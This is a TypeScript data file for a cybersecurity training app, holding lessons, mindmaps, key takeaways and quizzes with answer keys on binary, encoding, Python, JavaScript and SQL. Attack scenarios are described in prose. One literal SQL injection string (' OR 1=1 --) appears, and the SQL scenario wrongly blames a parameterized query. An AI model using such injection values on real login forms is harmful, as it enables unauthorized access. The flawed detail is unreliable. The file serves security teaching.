        description: 'Learn how computers store numbers, colors, and data using binary, hexadecimal, and octal number systems.',
        status: 'unlocked',
        iconType: 'data-repr',
        content: '',
        realWorldCallout: {
          title: 'The Forensic Hex Dump',
          concept: 'Binary & Hexadecimal Analysis',
          scenario: 'A digital forensics analyst receives a disk image from a compromised workstation. Using a hex editor, they identify suspicious file signatures (magic bytes) — the first bytes of each file that identify its type. They spot a hidden executable disguised as a JPEG by comparing the hex header (FF D8 FF) against the actual PE header (4D 5A). Converting hex to binary confirms the offset where shellcode was injected into the image.',
          relevance: 'Understanding binary and hexadecimal representation is essential for malware analysis, forensic imaging, and identifying obfuscated payloads in network captures.'
        },
        mindmap: [
          { id: 'dr-root', label: 'Data Representation', description: 'How computers store all information', x: 50, y: 15, connections: ['binary', 'hex', 'units', 'colors'] },
          { id: 'binary', label: 'Binary (Base 2)', description: '0 and 1 — transistor states', x: 15, y: 50 },
          { id: 'hex', label: 'Hexadecimal (Base 16)', description: '0-9, A-F — compact binary', x: 38, y: 55 },
          { id: 'units', label: 'Bit / Nibble / Byte', description: '1, 4, and 8 bits respectively', x: 62, y: 55 },
          { id: 'colors', label: 'RGB Colors', description: '3 bytes = 16.7M colors', x: 85, y: 50 }
        ],
        keyTakeaways: [
          'Computers store everything as binary (0 and 1) because transistors have only two states.',
          'One byte = 8 bits = 256 possible values (0–255).',
          'Hexadecimal is preferred by security professionals because it is compact and maps cleanly to binary nibbles.',
          'RGB colors use 3 bytes (24 bits) to represent 16.7 million colors.',
          'Binary conversion: memorize the place-value row 128, 64, 32, 16, 8, 4, 2, 1.',
          'File signatures (magic bytes) are identified using hexadecimal values in forensic analysis.'
        ],
        quiz: [
          {
            id: 'q-dr-1',
            question: 'How many unique values can a single byte represent?',
            type: 'text',
            correctAnswer: '256',
            hint: '2 raised to the power of 8.'
          },
          {
            id: 'q-dr-2',
            question: 'What is the hexadecimal equivalent of the binary value 11111111?',
            type: 'text',
            correctAnswer: 'FF',
            hint: 'Each nibble (1111) maps to F in hex.'
          },
          {
            id: 'q-dr-3',
            question: 'How many bits are in a nibble?',
            type: 'text',
            correctAnswer: '4',
            hint: 'Half a byte.'
          },
          {
            id: 'q-dr-4',
            question: 'What base does the hexadecimal number system use?',
            type: 'text',
            correctAnswer: '16',
            hint: '0–9 plus A–F.'
          },
          {
            id: 'q-dr-5',
            question: 'What RGB value produces pure white?',
            type: 'text',
            correctAnswer: '255, 255, 255',
            hint: 'Maximum intensity on all three channels.'
          }
        ]
      },
      {
        id: 'data-encoding',
        moduleId: 'software-basics',
        title: 'Data Encoding',
        description: 'Understand ASCII, Unicode, UTF-8, and how characters, emojis, and symbols are encoded for computers.',
        status: 'unlocked',
        iconType: 'data-encode',
        content: '',
        realWorldCallout: {
          title: 'The Base64-Encoded Malware Payload',
          concept: 'Encoding in Cybersecurity',
          scenario: 'A SOC analyst investigating a phishing email finds a suspicious PowerShell command embedded in the HTML body. The command contains a long Base64-encoded string. Decoding it reveals a second-stage downloader script that fetches a remote access trojan (RAT). The attacker used Base64 encoding to bypass email content filters that scan for known malicious keywords.',
          relevance: 'Encoding is not encryption — it provides no security. Attackers routinely use Base64, URL encoding, and Unicode tricks to evade detection. Understanding encoding schemes is critical for threat hunting and malware triage.'
        },
        mindmap: [
          { id: 'de-root', label: 'Data Encoding', description: 'Mapping characters to numbers', x: 50, y: 15, connections: ['ascii', 'unicode', 'utf', 'cyber'] },
          { id: 'ascii', label: 'ASCII', description: '128 characters — English only', x: 15, y: 50 },
          { id: 'unicode', label: 'Unicode', description: '150K+ characters — all languages', x: 38, y: 55 },
          { id: 'utf', label: 'UTF-8 / UTF-16', description: 'Variable-width encoding formats', x: 62, y: 55 },
          { id: 'cyber', label: 'Cyber Applications', description: 'XSS, SQL injection, encoding bypass', x: 85, y: 50 }
        ],
        keyTakeaways: [
          'ASCII maps 128 characters (letters, digits, symbols) to numbers 0–127.',
          'Unicode extends ASCII to support 150,000+ characters from every language, plus emojis.',
          'UTF-8 is the dominant encoding on the web — it is variable-width (1–4 bytes per character).',
          'Encoding is NOT encryption — it provides zero security; anyone can decode it.',
          'Attackers abuse encoding (Base64, URL encoding, Unicode homoglyphs) to bypass security filters.',
          'Mojibake (garbled text) occurs when the wrong encoding is used to read data.'
        ],
        quiz: [
          {
            id: 'q-de-1',
            question: 'How many characters does standard ASCII support?',
            type: 'text',
            correctAnswer: '128',
            hint: '7 bits = 2^7.'
          },
          {
            id: 'q-de-2',
            question: 'What is the ASCII decimal value for the uppercase letter A?',
            type: 'text',
            correctAnswer: '65',
            hint: 'The most famous ASCII value.'
          },
          {
            id: 'q-de-3',
            question: 'Which encoding format is used by over 98% of all websites?',
            type: 'text',
            correctAnswer: 'UTF-8',
            hint: 'Variable-width, backward-compatible with ASCII.'
          },
          {
            id: 'q-de-4',
            question: 'Is Base64 encoding a form of encryption?',
            type: 'text',
            correctAnswer: 'No',
            hint: 'Encoding is reversible without a key.'
          }
        ]
      },
      {
        id: 'python-simple-demo',
        moduleId: 'software-basics',
        title: 'Python: Simple Demo',
        description: 'Learn Python basics — variables, functions, input/output, and random numbers — by building a Guess the Number game.',
        status: 'unlocked',
        iconType: 'python-demo',
        content: '',
        realWorldCallout: {
          title: 'Automating Log Triage with Python',
          concept: 'Python Scripting in Cybersecurity',
          scenario: 'A security analyst at a mid-size company receives 500,000 authentication log entries daily. Manually reviewing them is impossible. They write a Python script using string parsing and conditionals to flag all failed login attempts from foreign IP addresses occurring outside business hours. The script reduces the triage workload from 8 hours to 15 minutes, immediately surfacing a brute-force campaign from a single IP with 12,000 failed attempts overnight.',
          relevance: 'Python is the most widely used scripting language in cybersecurity for automating log analysis, building custom tools, and rapid prototyping of exploits and defenses.'
        },
        mindmap: [
          { id: 'py-root', label: 'Python Basics', description: 'High-level scripting language', x: 50, y: 15, connections: ['variables', 'functions', 'io', 'types'] },
          { id: 'variables', label: 'Variables', description: 'Named containers for data', x: 15, y: 50 },
          { id: 'functions', label: 'Functions', description: 'print(), input(), randint()', x: 38, y: 55 },
          { id: 'io', label: 'Input / Output', description: 'User interaction via terminal', x: 62, y: 55 },
          { id: 'types', label: 'Data Types', description: 'int, str, float, bool', x: 85, y: 50 }
        ],
        keyTakeaways: [
          'Python is a high-level, interpreted language created by Guido van Rossum in 1991.',
          'Variables store data; Python does not require explicit type declarations.',
          'print() outputs to the screen; input() reads user input as a string.',
          'Type conversion (int(), str(), float()) is essential when working with user input.',
          'The random module provides randint() for generating random numbers.',
          'Python is the #1 language used in cybersecurity for automation, scripting, and tool development.'
        ],
        quiz: [
          {
            id: 'q-py-1',
            question: 'What function is used to display output in Python?',
            type: 'text',
            correctAnswer: 'print()',
            hint: 'It sends text to the terminal.'
          },
          {
            id: 'q-py-2',
            question: 'What data type does the input() function always return in Python?',
            type: 'text',
            correctAnswer: 'string',
            hint: 'Even if you type a number, it comes back as text.'
          },
          {
            id: 'q-py-3',
            question: 'Which module provides the randint() function?',
            type: 'text',
            correctAnswer: 'random',
            hint: 'import ______'
          },
          {
            id: 'q-py-4',
            question: 'What function converts a string to an integer in Python?',
            type: 'text',
            correctAnswer: 'int()',
            hint: 'Short for integer.'
          }
        ]
      },
      {
        id: 'javascript-simple-demo',
        moduleId: 'software-basics',
        title: 'JavaScript: Simple Demo',
        description: 'Learn JavaScript basics — variables, constants, random numbers, and DOM interaction — by building a browser game.',
        status: 'unlocked',
        iconType: 'js-demo',
        content: '',
        realWorldCallout: {
          title: 'Dissecting a Malicious Inline Script',
          concept: 'JavaScript in Web Security',
          scenario: 'A penetration tester discovers a Stored Cross-Site Scripting (XSS) vulnerability in a web application\'s comment field. An attacker had injected a <script> tag containing obfuscated JavaScript that uses document.cookie to steal session tokens and sends them to an external server via a hidden image request. The tester demonstrates how the script executes in every victim\'s browser when they view the page, hijacking their authenticated sessions.',
          relevance: 'Understanding JavaScript fundamentals is crucial for web application security — XSS remains in the OWASP Top 10 and is one of the most exploited vulnerability classes.'
        },
        mindmap: [
          { id: 'js-root', label: 'JavaScript Basics', description: 'The language of the web', x: 50, y: 15, connections: ['vars', 'dom', 'events', 'logic'] },
          { id: 'vars', label: 'Variables', description: 'let, const, var declarations', x: 15, y: 50 },
          { id: 'dom', label: 'DOM Interaction', description: 'document.getElementById()', x: 38, y: 55 },
          { id: 'events', label: 'Events', description: 'onclick, user-driven actions', x: 62, y: 55 },
          { id: 'logic', label: 'Program Logic', description: 'if/else, loops, functions', x: 85, y: 50 }
        ],
        keyTakeaways: [
          'JavaScript adds behavior and interactivity to web pages.',
          'let declares mutable variables; const declares immutable constants.',
          'Math.random() generates pseudo-random numbers between 0 and 1.',
          'DOM manipulation (document.getElementById) is how JS interacts with HTML elements.',
          'JavaScript runs in the browser by default, but also on the server via Node.js.',
          'Understanding JS is essential for XSS analysis, browser exploitation, and web app pentesting.'
        ],
        quiz: [
          {
            id: 'q-js-1',
            question: 'What keyword declares a variable whose value cannot be reassigned?',
            type: 'text',
            correctAnswer: 'const',
            hint: 'Short for constant.'
          },
          {
            id: 'q-js-2',
            question: 'What method generates a random number in JavaScript?',
            type: 'text',
            correctAnswer: 'Math.random()',
            hint: 'Part of the Math object.'
          },
          {
            id: 'q-js-3',
            question: 'What does DOM stand for?',
            type: 'text',
            correctAnswer: 'Document Object Model',
            hint: 'The tree structure of an HTML page.'
          },
          {
            id: 'q-js-4',
            question: 'Which OWASP Top 10 vulnerability is directly related to malicious JavaScript injection?',
            type: 'text',
            correctAnswer: 'Cross-Site Scripting',
            hint: 'XSS.'
          }
        ]
      },
      {
        id: 'database-sql-basics',
        moduleId: 'software-basics',
        title: 'Database SQL Basics',
        description: 'Learn relational databases, tables, SQL queries (SELECT, INSERT, UPDATE, DELETE), and JOINs.',
        status: 'unlocked',
        iconType: 'sql-basics',
        content: '',
        realWorldCallout: {
          title: 'Investigating a SQL Injection Attack',
          concept: 'SQL in Security Operations',
          scenario: 'A web application firewall (WAF) alerts on suspicious traffic containing the string \' OR 1=1 -- in a login form\'s username field. The SOC analyst examines the application\'s SQL query logs and finds that the attacker bypassed authentication by injecting SQL syntax that makes the WHERE clause always evaluate to TRUE. The analyst traces the attack to a parameterized query that was missing input sanitization, allowing the attacker to dump the entire users table including password hashes.',
          relevance: 'SQL injection remains one of the most dangerous web vulnerabilities. Understanding SQL syntax is essential for both detecting injection attempts in logs and writing secure queries that use parameterized statements.'
        },
        mindmap: [
          { id: 'sql-root', label: 'SQL Basics', description: 'Structured Query Language', x: 50, y: 15, connections: ['crud', 'tables', 'joins', 'security'] },
          { id: 'crud', label: 'CRUD Operations', description: 'SELECT, INSERT, UPDATE, DELETE', x: 15, y: 50 },
          { id: 'tables', label: 'Tables & Schema', description: 'Rows, columns, primary keys', x: 38, y: 55 },
          { id: 'joins', label: 'JOINs', description: 'Combine data from multiple tables', x: 62, y: 55 },
          { id: 'security', label: 'SQL Injection', description: 'Prevent with parameterized queries', x: 85, y: 50 }
        ],
        keyTakeaways: [
          'A database organizes data into tables with rows (records) and columns (fields).',
          'SQL (Structured Query Language) is the standard language for interacting with relational databases.',
          'CRUD operations: SELECT (read), INSERT (create), UPDATE (modify), DELETE (remove).',
          'WHERE clauses filter results; ORDER BY sorts them; LIMIT restricts the count.',
          'JOINs combine data from multiple related tables using foreign keys.',
          'SQL injection is one of the most exploited web vulnerabilities — always use parameterized queries.',
          'MySQL, PostgreSQL, SQLite, and MSSQL are the most common relational database engines.'
        ],
        quiz: [
          {
            id: 'q-sql-1',
            question: 'What SQL command retrieves data from a table?',
            type: 'text',
            correctAnswer: 'SELECT',
            hint: 'You \"select\" which data you want.'
          },
          {
            id: 'q-sql-2',
            question: 'What clause filters rows in a SQL query?',
            type: 'text',
            correctAnswer: 'WHERE',
            hint: 'Specifies the condition.'
          },
          {
            id: 'q-sql-3',
            question: 'What SQL keyword combines rows from two or more tables?',
            type: 'text',
            correctAnswer: 'JOIN',
            hint: 'Connects related tables.'
          },
          {
            id: 'q-sql-4',
            question: 'What technique should always be used to prevent SQL injection?',
            type: 'text',
            correctAnswer: 'Parameterized queries',
            hint: 'Also called prepared statements.'
          },
          {
            id: 'q-sql-5',
            question: 'What does CRUD stand for?',
            type: 'text',
            correctAnswer: 'Create, Read, Update, Delete',
            hint: 'The four basic database operations.'
          }
        ]
      },
      {
        id: 'mystery-chest-software-basics',
        moduleId: 'software-basics',
        title: 'Mystery Chest',
        description: 'Rapid revision: memory tricks, interview questions, and quick review for the entire Software Basics module.',
        status: 'unlocked',
        iconType: 'mystery-chest-software',
        content: '',
        realWorldCallout: undefined,
        mindmap: [
          { id: 'mc-sw-root', label: 'Mystery Chest', description: 'Software Basics Rapid Revision', x: 50, y: 25, connections: ['mem', 'interview'] },
          { id: 'mem', label: 'Memory Tricks', description: 'Mnemonics and shortcuts', x: 25, y: 60 },
          { id: 'interview', label: 'Interview Questions', description: 'Common Q&A for job prep', x: 75, y: 60 }
        ],
        keyTakeaways: [
          'Binary place values: 128, 64, 32, 16, 8, 4, 2, 1.',
          'ASCII A = 65, a = 97; UTF-8 is backward-compatible with ASCII.',
          'Python: print() for output, input() for input, int() for conversion.',
          'JavaScript: let for variables, const for constants, Math.random() for randomness.',
          'SQL: SELECT * FROM table WHERE condition — the fundamental query pattern.',
          'Encoding is NOT encryption — always remember this distinction.',
          'Review all memory tricks and interview questions before exams or interviews.'
        ],
        quiz: []
      }
    ]
  },
    {
    id: 'attacks-and-defenses',
    title: 'Attacks and Defenses',
    description: 'Understand the CIA Triad, cryptography fundamentals, and how attackers and defenders operate in the real world.',
    topics: [
      {
        id: 'the-cia-triad',
        moduleId: 'attacks-and-defenses',
        title: 'The CIA Triad',
        description: 'Confidentiality, Integrity, and Availability — the three pillars of security.',
        status: 'unlocked',
        iconType: 'cia-prism',
        content: '',
        mindmap: [
          { id: 'cia-root', label: 'CIA Triad', description: 'The foundation of security', x: 50, y: 15, connections: ['conf', 'int', 'avail'] },
          { id: 'conf', label: 'Confidentiality', description: 'Data privacy', x: 20, y: 50 },
          { id: 'int', label: 'Integrity', description: 'Data accuracy', x: 50, y: 55 },
          { id: 'avail', label: 'Availability', description: 'System uptime', x: 80, y: 50 }
        ],
        keyTakeaways: [],
        quiz: []
      },
      {
        id: 'cryptography-concepts',
        moduleId: 'attacks-and-defenses',
        title: 'Cryptography Concepts',
        description: 'Learn how encryption, hashing, and digital certificates protect information.',
        status: 'unlocked',
        iconType: 'crypto-laptop',
        content: '',
        mindmap: [
          { id: 'crypto-root', label: 'Cryptography', description: 'Securing data', x: 50, y: 15, connections: ['sym', 'asym', 'hash'] },
          { id: 'sym', label: 'Symmetric', description: 'One key', x: 20, y: 50 },
          { id: 'asym', label: 'Asymmetric', description: 'Public/Private key pair', x: 50, y: 55 },
          { id: 'hash', label: 'Hashing', description: 'One-way math', x: 80, y: 50 }
        ],
        keyTakeaways: [],
        quiz: []
      },
      {
        id: 'become-a-hacker',
        moduleId: 'attacks-and-defenses',
        title: 'Become a Hacker',
        description: 'Understand the offensive security workflow, enumeration, and exploitation.',
        status: 'unlocked',
        iconType: 'hacker-terminal',
        content: '',
        mindmap: [
          { id: 'hacker-root', label: 'Offensive Security', description: 'Attacking systems', x: 50, y: 15, connections: ['enum', 'exploit', 'auto'] },
          { id: 'enum', label: 'Enumeration', description: 'Finding targets', x: 20, y: 50 },
          { id: 'exploit', label: 'Exploitation', description: 'Attacking vulnerabilities', x: 50, y: 55 },
          { id: 'auto', label: 'Automation', description: 'Hydra, scripting', x: 80, y: 50 }
        ],
        keyTakeaways: [],
        quiz: []
      },
      {
        id: 'become-a-defender',
        moduleId: 'attacks-and-defenses',
        title: 'Become a Defender',
        description: 'Learn defensive security lifecycles, environment mapping, and threat detection.',
        status: 'unlocked',
        iconType: 'defender-shield',
        content: '',
        mindmap: [
          { id: 'def-root', label: 'Defensive Security', description: 'Protecting systems', x: 50, y: 15, connections: ['map', 'detect', 'respond'] },
          { id: 'map', label: 'Mapping', description: 'Understanding infrastructure', x: 20, y: 50 },
          { id: 'detect', label: 'Detection', description: 'Finding attacks', x: 50, y: 55 },
          { id: 'respond', label: 'Response', description: 'Stopping attacks', x: 80, y: 50 }
        ],
        keyTakeaways: [],
        quiz: []
      },
      {
        id: 'mystery-chest',
        moduleId: 'attacks-and-defenses',
        title: 'Mystery Chest',
        description: 'Rapid revision and interview questions for Attacks and Defenses.',
        status: 'unlocked',
        iconType: 'mystery-chest',
        content: '',
        mindmap: [
          { id: 'mc-ad-root', label: 'Mystery Chest', description: 'Attacks & Defenses Revision', x: 50, y: 25, connections: ['mem', 'interview'] },
          { id: 'mem', label: 'Memory Tricks', description: 'Mnemonics and shortcuts', x: 25, y: 60 },
          { id: 'interview', label: 'Interview Questions', description: 'Common Q&A for job prep', x: 75, y: 60 }
        ],
        keyTakeaways: [],
        quiz: []
      }
    ]
  }
];

export const COURSES_DATA: Course[] = [
  {
    id: 'google-cybersecurity',
    name: 'Google — Cybersecurity Professional Certificate',
    description: 'Google\'s professional cybersecurity program — foundations, risk management, network security, Linux/SQL, threats, detection, Python, and job prep.',
    slug: 'google-cybersecurity',
    active: true,
    comingSoon: false,
    modules: GOOGLE_CYBER_MODULES
  },
  {
    id: 'pre-security',
    name: 'TryHackMe — Pre Security',
    description: 'Foundational cybersecurity: offensive, defensive, networking, and web basics.',
    slug: 'pre-security',
    active: true,
    modules: MODULES_DATA
  },
  {
    id: 'soc-level-1',
    name: 'TryHackMe — SOC Level 1',
    description: 'Become a Junior Security Operations Center Analyst monitoring traffic.',
    slug: 'soc-level-1',
    active: false,
    comingSoon: true,
    modules: []
  },
  {
    id: 'jr-pentester',
    name: 'TryHackMe — Junior Penetration Tester',
    description: 'Master the core skills required to start a career in penetration testing.',
    slug: 'jr-pentester',
    active: false,
    comingSoon: true,
    modules: []
  }
];
